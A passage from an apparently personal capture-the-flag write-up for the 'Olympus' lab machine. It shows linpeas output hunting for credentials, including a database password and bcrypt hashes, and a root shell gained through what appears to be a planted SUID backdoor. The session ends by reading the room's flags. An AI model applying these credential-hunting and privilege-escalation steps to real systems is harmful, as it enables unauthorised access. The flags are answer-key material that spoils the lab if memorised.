-rw-r--r-- 1 root root 6176 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.bpf.o.d
-rw-r--r-- 1 root root 8021 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.linker.o.cmd
-rw-r--r-- 1 root root 7773 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.netlink.o.d
-rw-r--r-- 1 root root 7343 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.strset.o.cmd
-rw-r--r-- 1 root root 9029 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.libbpf_probes.o.cmd
-rw-r--r-- 1 root root 8673 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.xsk.o.d
-rw-r--r-- 1 root root 1682 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.str_error.o.d
-rw-r--r-- 1 root root 11173 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.libbpf.o.cmd
-rw-r--r-- 1 root root 5071 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.hashmap.o.d
-rw-r--r-- 1 root root 8462 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.ringbuf.o.cmd
-rw-r--r-- 1 root root 7987 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.btf.o.d
-rw-r--r-- 1 root root 9534 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.libbpf.o.d
-rw-r--r-- 1 root root 7800 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.bpf.o.cmd
-rw-r--r-- 1 root root 7355 Mar 28 14:04 /usr/src/linux-headers-5.15.0-138-generic/tools/bpf/resolve_btfids/libbpf/staticobjs/.libbpf_probes.o.d

[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
-rw-rw-r-- 1 zeus zeus 51553 Jun 18 14:17 /tmp/report
-rwxrwxr-x 1 zeus zeus 233380 Jun 18 14:15 /tmp/linpeas.sh
-rw-r--r-- 1 root root 730469 Apr 27 06:21 /var/backups/dpkg.status.0
-rw-r--r-- 1 root root 4479 Mar 22  2022 /var/backups/apt.extended_states.5.gz
-rw-r--r-- 1 root root 4656 Apr 25  2022 /var/backups/apt.extended_states.1.gz
-rw-r--r-- 1 root root 172 Mar 22  2022 /var/backups/dpkg.statoverride.0
-rw-r--r-- 1 root root 61440 Apr 27 06:25 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 4678 Apr 24  2022 /var/backups/apt.extended_states.2.gz
-rw-r--r-- 1 root root 43283 May 11 16:06 /var/backups/apt.extended_states.0
-rw-r--r-- 1 root root 4634 Apr 14  2022 /var/backups/apt.extended_states.4.gz
-rw-r--r-- 1 root root 268 Mar 22  2022 /var/backups/dpkg.diversions.0
-rw-r--r-- 1 root root 4658 Apr 18  2022 /var/backups/apt.extended_states.3.gz

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/mqueue/linpeas.txt
/dev/shm
/home/zeus
/run/cloud-init/tmp
/run/lock
/run/screen
/run/screen/S-zeus
/run/user/1000
/run/user/1000/dbus-1
/run/user/1000/dbus-1/services
/run/user/1000/gnupg
/run/user/1000/inaccessible
/run/user/1000/systemd
/run/user/1000/systemd/transient
/run/user/1000/systemd/units
/snap/core20/1518/run/lock
/snap/core20/1518/tmp
/snap/core20/1518/var/tmp
/snap/core20/2571/run/lock
/snap/core20/2571/tmp
/snap/core20/2571/var/tmp
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/report
/tmp/.Test-unix
/tmp/tmux-1000
/tmp/.X11-unix
/tmp/.XIM-unix
/usr/bin/cputils
/var/crash
/var/lib/php/sessions
/var/tmp
/var/www/olympus.thm/public_html/~webmaster/search.php

[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group zeus:
/dev/mqueue/linpeas.txt
/tmp/report
/tmp/linpeas.sh
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc
  Group adm:
  Group cdrom:
  Group sudo:
  Group dip:
  Group plugdev:

[+] Searching passwords in config PHP files
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
define('DB_PASSWORD', 'phpmyadmin');


[+] Finding IPs inside logs (limit 70)
    247 /var/log/apache2/access.log:10.10.34.122
    187 /var/log/cloud-init.log:169.254.169.254
     43 /var/log/apache2/error.log:10.10.34.122
     29 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-0000000000000001-0005dad005efb382.journal:192.168.61.209
     20 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-0000000000000001-0005dad005efb382.journal:192.168.254.209
     13 /var/log/wtmp:192.168.254.209
     10 /var/log/wtmp:192.168.61.209
     10 /var/log/syslog:52.92.18.242
     10 /var/log/cloud-init-output.log:52.92.18.242
      9 /var/log/syslog:91.189.91.157
      9 /var/log/syslog:185.125.190.58
      9 /var/log/syslog:185.125.190.57
      9 /var/log/syslog:185.125.190.56
      8 /var/log/journal/2e6fb665155b4633af31afe0aa376873/user-1000@35fbfb50547f44b9a39eb57ed5e9b840-0000000000013e35-0005dc9a4bae644d.journal:192.168.204.209
      8 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system.journal:10.10.31.236
      8 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001e58b-0005dcf3253949de.journal:192.168.1.1
      8 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000000cadb-0005dae8271f700b.journal:192.168.254.209
      7 /var/log/wtmp:192.168.204.209
      7 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001a8d9-0005dcb252a038f6.journal:192.168.1.1
      7 /var/log/cloud-init.log:10.10.31.236
      7 /var/log/apache2/access.log.1:192.168.1.54
      6 /var/log/syslog.1:10.10.31.236
      6 /var/log/journal/2e6fb665155b4633af31afe0aa376873/user-1000@35fbfb50547f44b9a39eb57ed5e9b840-000000000000f912-0005db2ff03d7ad3.journal:192.168.204.209
      6 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000002d017-0005e3df18db9f5a.journal:192.168.1.1
      6 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-0000000000029bb1-0005e3dd6b4ded68.journal:192.168.1.1
      6 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-00000000000275e5-0005ddeee9290f06.journal:192.168.97.124
      6 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001e58b-0005dcf3253949de.journal:192.168.146.73
      6 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-00000000000136c7-0005dc99b3a1f9f3.journal:192.168.204.42
      6 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000000f31e-0005db2f80bb8674.journal:192.168.38.177
      6 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000000f31e-0005db2f80bb8674.journal:192.168.204.42
      6 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-0000000000000001-0005dad005efb382.journal:192.168.61.70
      6 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-0000000000000001-0005dad005efb382.journal:192.168.254.14
      5 /var/log/wtmp:192.168.1.54
      5 /var/log/syslog:3.5.70.22
      5 /var/log/syslog:3.5.69.139
      5 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-0000000000029bb1-0005e3dd6b4ded68.journal:192.168.1.54
      5 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001e58b-0005dcf3253949de.journal:192.168.250.152
      5 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001a8d9-0005dcb252a038f6.journal:192.168.204.42
      5 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-00000000000136c7-0005dc99b3a1f9f3.journal:192.168.204.209
      5 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000000f31e-0005db2f80bb8674.journal:192.168.204.209
      5 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000000e888-0005db077aeaadf0.journal:192.168.88.200
      5 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000000de40-0005daea62797c64.journal:192.168.254.14
      5 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000000cadb-0005dae8271f700b.journal:192.168.254.14
      5 /var/log/cloud-init-output.log:3.5.70.22
      5 /var/log/cloud-init-output.log:3.5.69.139
      4 /var/log/journal/2e6fb665155b4633af31afe0aa376873/user-1000@5662163830904b989933ad1d7def922f-0000000000029d67-0005e3dd70008f6c.journal:192.168.1.54
      4 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000002d017-0005e3df18db9f5a.journal:172.30.32.1
      4 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001e58b-0005dcf3253949de.journal:255.255.255.255
      4 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001e58b-0005dcf3253949de.journal:192.168.97.124
      4 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001e58b-0005dcf3253949de.journal:192.168.1.80
      3 /var/log/wtmp:192.168.1.80
      3 /var/log/syslog.1:255.255.255.255
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system.journal:255.255.255.255
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-0000000000031aef-000633bc6a0e88cd.journal:10.10.176.84
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000002d017-0005e3df18db9f5a.journal:192.168.1.30
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000002d017-0005e3df18db9f5a.journal:172.30.35.101
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-0000000000029bb1-0005e3dd6b4ded68.journal:192.168.1.30
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-00000000000275e5-0005ddeee9290f06.journal:192.168.97.77
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-00000000000275e5-0005ddeee9290f06.journal:192.168.97.209
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001e58b-0005dcf3253949de.journal:192.168.97.77
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001e58b-0005dcf3253949de.journal:192.168.250.77
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001e58b-0005dcf3253949de.journal:192.168.146.77
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001e58b-0005dcf3253949de.journal:192.168.1.29
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001a8d9-0005dcb252a038f6.journal:192.168.204.77
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000001a8d9-0005dcb252a038f6.journal:192.168.1.29
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-00000000000136c7-0005dc99b3a1f9f3.journal:192.168.204.77
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000000f31e-0005db2f80bb8674.journal:192.168.38.77
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000000f31e-0005db2f80bb8674.journal:192.168.204.77
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000000e888-0005db077aeaadf0.journal:192.168.88.77
      3 /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@a6bd19ae082547e28c9c6644b8f5bc50-000000000000de40-0005daea62797c64.journal:192.168.254.77

[+] Finding passwords inside logs (limit 70)
Binary file /var/log/journal/2e6fb665155b4633af31afe0aa376873/system@000637d80cf7f8ac-c089a24571b0cbb1.journal~ matches
Binary file /var/log/journal/2e6fb665155b4633af31afe0aa376873/system.journal matches
Binary file /var/log/journal/2e6fb665155b4633af31afe0aa376873/user-1000.journal matches
Binary file /var/log/syslog.1 matches
Binary file /var/log/syslog.4.gz matches
/var/log/auth.log.1:Jun 18 12:49:32 ip-10-10-31-236 passwd[672]: password for 'ubuntu' changed by 'root'
/var/log/auth.log:Jun 18 13:41:46 ip-10-10-31-236 sshd[1680]: Failed password for zeus from 127.0.0.1 port 33988 ssh2
/var/log/auth.log:Jun 18 13:41:54 ip-10-10-31-236 sshd[1680]: Failed password for zeus from 127.0.0.1 port 33988 ssh2
/var/log/auth.log:Jun 18 14:19:12 ip-10-10-31-236 sudo: pam_unix(sudo:auth): auth could not identify password for [zeus]
/var/log/auth.log:Jun 18 14:19:12 ip-10-10-31-236 sudo:     zeus : 1 incorrect password attempt ; TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=list
/var/log/cloud-init.log:2025-06-18 12:49:23,992 - performance.py[DEBUG]: Running ['passwd', '-l', 'ubuntu'] took 0.048 seconds
/var/log/cloud-init.log:2025-06-18 12:49:25,846 - cc_set_passwords.py[DEBUG]: Leaving SSH config 'PasswordAuthentication' unchanged. ssh_pwauth=None
/var/log/dmesg.0:[    5.485400] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/dmesg:[   17.120152] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/installer/installer-journal.txt:Mar 22 14:40:11 ubuntu-server chage[5833]: changed password expiry for usbmux
/var/log/installer/installer-journal.txt:Mar 22 14:40:11 ubuntu-server usermod[5826]: change user 'usbmux' password
/var/log/installer/installer-journal.txt:Mar 22 14:42:03 ubuntu-server chage[17421]: changed password expiry for sshd
/var/log/installer/installer-journal.txt:Mar 22 14:42:03 ubuntu-server usermod[17414]: change user 'sshd' password
/var/log/installer/installer-journal.txt:Mar 22 14:50:55 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
/var/log/installer/installer-journal.txt:Mar 22 14:50:55 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/installer/installer-journal.txt:Mar 22 14:51:41 ubuntu-server chpasswd[2359]: pam_unix(chpasswd:chauthtok): password changed for installer
/var/log/syslog.1:May 11 16:07:40 olympus kernel: [    5.485400] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
/var/log/syslog.1:May 11 16:07:40 olympus systemd[1]: Condition check resulted in Forward Password Requests to Plymouth Directory Watch being skipped.
/var/log/syslog.1:May 11 16:07:40 olympus systemd[1]: Started Dispatch Password Requests to Console Directory Watch.

[+] Finding emails inside logs (limit 70)
      2 /var/log/kern.log.1:giometti@linux.it
      2 /var/log/kern.log.1:dm-devel@redhat.com
      1 /var/log/syslog.1:giometti@linux.it
      1 /var/log/syslog.1:dm-devel@redhat.com
      1 /var/log/installer/installer-journal.txt:giometti@linux.it
      1 /var/log/installer/installer-journal.txt:dm-devel@redhat.com
      1 /var/log/dmesg:giometti@linux.it
      1 /var/log/dmesg:dm-devel@redhat.com
      1 /var/log/dmesg.0:giometti@linux.it
      1 /var/log/dmesg.0:dm-devel@redhat.com

[+] Finding *password* or *credential* files in home (limit 70)

[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/etc/amazon/ssm/README.md:docker run -it --rm --name ssm-agent-build-container -v `pwd`:/amazon-ssm-agent ssm-agent-build-image make build-release
/etc/cloud/cloud.cfg:    lock_passwd: True
/etc/cloud/cloud.cfg:    sudo: ["ALL=(ALL) NOPASSWD:ALL"]
/etc/nsswitch.conf:passwd:         files systemd
/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
/etc/phpmyadmin/config.inc.php:    $cfg['Servers'][$i]['AllowNoPassword'] = true;
/etc/phpmyadmin/config.inc.php:    // $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
/etc/phpmyadmin/config.inc.php:// $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
/etc/security/namespace.init:        passwd=$(getent passwd "$user")
/etc/ssl/openssl.cnf:challengePassword		= A challenge password
/etc/ssl/openssl.cnf:challengePassword_max		= 20
/etc/ssl/openssl.cnf:challengePassword_min		= 4
/tmp/linpeas.sh:    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
/tmp/linpeas.sh:  FIND_PASSWORD_RELEVANT_NAMES=$(prep_to_find "$PASSWORD_RELEVANT_NAMES")
/tmp/linpeas.sh:    for f in $tomcat; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
/tmp/linpeas.sh:PASSWORD=""
/tmp/linpeas.sh:  PASSWORD_RELEVANT_NAMES="*password* *credential* creds*"
/tmp/linpeas.sh:  PASSWORDTRY=$2
/tmp/linpeas.sh:    P)  PASSWORD=$OPTARG;;
/tmp/linpeas.sh:    printf $Y"[+] "$GREEN"Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
/tmp/linpeas.sh:      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
/var/backups/dpkg.status.0:Depends: passwd, debconf (>= 0.5) | debconf-2.0
/var/www/chat.olympus.thm/chats.sql:('zeus', 'Attached : prometheus_password.txt', '22-03-14 10:13pm', ''),
/var/www/chat.olympus.thm/public_html/config.php:define('DB_PASSWORD', 'phpmyadmin');
/var/www/chat.olympus.thm/public_html/config.php:define('DB_USERNAME', 'phpmyadmin');
/var/www/chat.olympus.thm/public_html/login.php:        $password_err = "Please enter your password.";
/var/www/chat.olympus.thm/public_html/login.php:        $password = trim($_POST["password"]);
/var/www/chat.olympus.thm/public_html/login.php:        $sql = "SELECT user_id, user_name, user_password FROM users WHERE user_name = ?";
/var/www/chat.olympus.thm/public_html/login.php:$username = $password = "";
/var/www/chat.olympus.thm/public_html/login.php:$username_err = $password_err = $login_err = "";
/var/www/chat.olympus.thm/public_html/reset-password.php:            $confirm_password_err = "Password did not match.";
/var/www/chat.olympus.thm/public_html/reset-password.php:        $confirm_password_err = "Please confirm the password.";
/var/www/chat.olympus.thm/public_html/reset-password.php:        $confirm_password = trim($_POST["confirm_password"]);
/var/www/chat.olympus.thm/public_html/reset-password.php:$new_password = $confirm_password = "";
/var/www/chat.olympus.thm/public_html/reset-password.php:$new_password_err = $confirm_password_err = "";
/var/www/chat.olympus.thm/public_html/reset-password.php:        $new_password_err = "Password must have atleast 6 characters.";
/var/www/chat.olympus.thm/public_html/reset-password.php:        $new_password_err = "Please enter the new password.";
/var/www/chat.olympus.thm/public_html/reset-password.php:        $new_password = trim($_POST["new_password"]);
/var/www/chat.olympus.thm/public_html/reset-password.php:            $param_password = password_hash($new_password, PASSWORD_DEFAULT);
/var/www/chat.olympus.thm/public_html/reset-password.php:        $sql = "UPDATE users SET password = ? WHERE id = ?";
/var/www/chat.olympus.thm/public_html/reset-password.php:        if(empty($new_password_err) && ($new_password != $confirm_password)){
/var/www/olympus.thm/public_html/~webmaster/admin/includes/admin_add_user.php:	$user_password = $_POST['user_password'];
/var/www/olympus.thm/public_html/~webmaster/admin/profile.php:		$user_password = $_POST['user_password'];
/var/www/olympus.thm/public_html/~webmaster/admin/profile.php:		$user_password = $row['user_password'];
/var/www/olympus.thm/public_html/~webmaster/includes/db.php:$db['db_password'] = 'phpmyadmin';
/var/www/olympus.thm/public_html/~webmaster/includes/login.php:	$user_password = $_POST['user_password'];
/var/www/olympus.thm/public_html/~webmaster/includes/login.php:		$us_password = $row['user_password'];

[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/var/www/olympus.thm/public_html/~webmaster/includes/db.php:$db['db_host'] = 'localhost';
/var/www/olympus.thm/public_html/~webmaster/includes/db.php:$db['db_username'] = 'phpmyadmin';
/var/www/olympus.thm/public_html/~webmaster/README.md:	`$DB_host = "localhost"; $DB_user = "root"; $DB_pass = ""; $DB_name = "users_details";`

[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
/tmp/linpeas.sh:    for f in $tomcat; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
/var/www/chat.olympus.thm/public_html/login.php:            $param_username = $username;
/var/www/chat.olympus.thm/public_html/login.php:                            $_SESSION["username"] = $username;
/var/www/chat.olympus.thm/public_html/login.php:$username = $password = "";
/var/www/chat.olympus.thm/public_html/login.php:$username_err = $password_err = $login_err = "";
/var/www/chat.olympus.thm/public_html/login.php:        $username_err = "Please enter username.";
/var/www/chat.olympus.thm/public_html/login.php:        $username = trim($_POST["username"]);
/var/www/olympus.thm/public_html/~webmaster/admin/profile.php:	$session_username = $_SESSION['username'];
/var/www/olympus.thm/public_html/~webmaster/includes/db.php:$db['db_username'] = 'phpmyadmin';
/var/www/olympus.thm/public_html/~webmaster/includes/login.php:			$_SESSION['username'] = $us_user;

[+] Searching specific hashes inside files - less false positives (limit 70)
/var/www/olympus.thm/olympus.sql:$2y$10$qWbn4ULR1Wd9SAs7vFBdz.LzX9y7vB9Z3FlzWeMhM3kaajGAfXms6
/var/www/olympus.thm/public_html/~webmaster/php_cms.sql:$2y$10$6kFvYVJQEndRCVZbSCx6sOcp5E3oCnCK03oIY/0ZnJWjsjub2Z5g6












































```bash
zeus@ip-10-10-31-236:/var/www/html$ cd 0aB44fdS3eDnLkpsz3deGv8TttR4sc
zeus@ip-10-10-31-236:/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc$ uname -a ; w; $suid_bd; /lib/defended/libc.so.99
Linux ip-10-10-31-236 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 14:27:12 up  1:38,  2 users,  load average: 0.01, 0.33, 0.27
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
zeus     pts/1    10.10.34.122     13:40    0.00s  0.45s  0.42s ssh -i id_rsa zeus@olympus.thm
zeus     pts/2    127.0.0.1        13:43    0.00s  0.08s  0.00s w
# whoami
root
# cat /root/root.txt
cat: /root/root.txt: No such file or directory
# cd root
sh: 3: cd: can't cd to root
# cd /root
# ls
config	root.flag  snap
# cat root.flag
                    ### Congrats !! ###




                            (
                .            )        )
                         (  (|              .
                     )   )\/ ( ( (
             *  (   ((  /     ))\))  (  )    )
           (     \   )\(          |  ))( )  (|
           >)     ))/   |          )/  \((  ) \
           (     (      .        -.     V )/   )(    (
            \   /     .   \            .       \))   ))
              )(      (  | |   )            .    (  /
             )(    ,'))     \ /          \( `.    )
             (\>  ,'/__      ))            __`.  /
            ( \   | /  ___   ( \/     ___   \ | ( (
             \.)  |/  /   \__      __/   \   \|  ))
            .  \. |>  \      | __ |      /   <|  /
                 )/    \____/ :..: \____/     \ <
          )   \ (|__  .      / ;: \          __| )  (
         ((    )\)  ~--_     --  --      _--~    /  ))
          \    (    |  ||               ||  |   (  /
                \.  |  ||_             _||  |  /
                  > :  |  ~V+-I_I_I-+V~  |  : (.
                 (  \:  T\   _     _   /T  : ./
                  \  :    T^T T-+-T T^T    ;<
                   \..`_       -+-       _'  )
                      . `--=.._____..=--'. ./          




                You did it, you defeated the gods.
                        Hope you had fun !



                   flag{D4mN!_Y0u_G0T_m3_:)_}




PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

                  (Hint : regex can be usefull)



























![image](https://github.com/user-attachments/assets/2030a888-6538-44b7-8c55-b2245500a634)

![image](https://github.com/user-attachments/assets/3ea0051e-11d2-4b94-9eba-2c5e7958261e)

```bash
PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)

                  (Hint : regex can be usefull)
# cd /etc
# ls
adduser.conf		ca-certificates.conf.dpkg-old  deluser.conf  gshadow	      landscape       ltrace.conf     multipath.conf	   perl			    rc5.d	  ssh		    udisks2
alternatives		calendar		       depmod.d      gshadow-	      ldap	      lvm	      mysql		   php			    rc6.d	  ssl		    ufw
amazon			cloud			       dhcp	     gss	      ld.so.cache     machine-id      nanorc		   phpmyadmin		    rc.local	  subgid	    update-manager
apache2			console-setup		       dpkg	     hdparm.conf      ld.so.conf      magic	      netplan		   pki			    rcS.d	  subgid-	    update-motd.d
apparmor		cron.d			       e2scrub.conf  host.conf	      ld.so.conf.d    magic.mime      network		   pm			    resolv.conf   subuid	    update-notifier
apparmor.d		cron.daily		       emacs	     hostname	      legal	      mailcap	      networkd-dispatcher  polkit-1		    rmt		  subuid-	    UPower
apport			cron.hourly		       environment   hosts	      libaudit.conf   mailcap.order   NetworkManager	   pollinate		    rpc		  sudoers	    usb_modeswitch.conf
apt			cron.monthly		       ethertypes    hosts.allow      libblockdev     manpath.config  networks		   popularity-contest.conf  rsyslog.conf  sudoers.d	    usb_modeswitch.d
at.deny			crontab			       fonts	     hosts.deny       libnl-3	      mdadm	      newt		   profile		    rsyslog.d	  sysctl.conf	    vim
avahi			cron.weekly		       fstab	     init	      lighttpd	      mecabrc	      nsswitch.conf	   profile.d		    screenrc	  sysctl.d	    vmimport.rc.local
bash.bashrc		cryptsetup-initramfs	       fstab.orig    init.d	      locale.alias    mime.types      opt		   protocols		    security	  systemd	    vmware-tools
bash_completion		crypttab		       fuse.conf     initramfs-tools  locale.gen      mke2fs.conf     os-release	   python3		    selinux	  terminfo	    vtrgb
bash_completion.d	dbconfig-common		       fwupd	     inputrc	      localtime       ModemManager    overlayroot.conf	   python3.8		    services	  thermald	    wgetrc
bindresvport.blacklist	dbus-1			       gai.conf      iproute2	      logcheck	      modprobe.d      PackageKit	   rc0.d		    shadow	  timezone	    X11
binfmt.d		dconf			       groff	     iscsi	      login.defs      modules	      pam.conf		   rc1.d		    shadow-	  tmpfiles.d	    xattr.conf
byobu			debconf.conf		       group	     issue	      logrotate.conf  modules-load.d  pam.d		   rc2.d		    shells	  ubuntu-advantage  xdg
ca-certificates		debian_version		       group-	     issue.net	      logrotate.d     mtab	      passwd		   rc3.d		    skel	  ucf.conf	    zsh_command_not_found
ca-certificates.conf	default			       grub.d	     kernel	      lsb-release     multipath       passwd-		   rc4.d		    sos		  udev
# grep -irl flag{
ssl/private/.b0nus.fl4g
# cat ssl/private/.b0nus.fl4g
Here is the final flag ! Congrats !

flag{Y0u_G0t_m3_g00d!}


As a reminder, here is a usefull regex :

grep -irl flag{




Hope you liked the room ;)
# 

```




![image](https://github.com/user-attachments/assets/141cf6fd-c3a6-4aa2-bd7e-600172636b17)

![image](https://github.com/user-attachments/assets/326f4899-a5b6-40bf-953d-ebe1d0ad7c24)


<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| June 18 2025      | 408      |     198ᵗʰ    |      5ᵗʰ     |     275ᵗʰ   |     4ᵗʰ    |  108,669 |    787    |     63    |

</div>


